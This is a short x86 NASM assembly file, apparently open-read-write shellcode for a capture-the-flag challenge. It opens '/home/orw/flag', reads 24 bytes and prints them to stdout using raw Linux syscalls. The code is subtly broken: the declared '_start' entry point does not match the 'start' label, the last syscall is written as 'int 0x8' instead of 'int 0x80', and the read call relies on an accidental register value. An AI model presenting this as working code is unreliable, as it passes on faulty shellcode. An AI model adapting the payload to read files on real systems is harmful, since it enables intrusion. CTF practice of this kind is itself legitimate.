section .bss
info    resb 24

section .data
flag db '/home/orw/flag'

section .text
global _start

start:
        ; 5 sys_open('filepath', 0)
        mov ecx, 0                  ; 0 read-only | 1 write-only | 2 read-write
        mov ebx, flag               ; memory address of file name
        mov eax, 5
        int 0x80

        ; 3 sys_read(3, [address], size)
        mov edx, 24                 ; size to read
        mov ecx, info               ; memory address of file contents.(info)
        mov ebx, eax                ; open() returned FD and load into EAX (3)
        int 0x80

        ; 4 sys_write(1, [address], size)
        mov edx, 24                 ; size to read
        mov ecx, info               ; file contents
        mov ebx, 1                  ; stdout
        mov eax, 4
        int 0x8
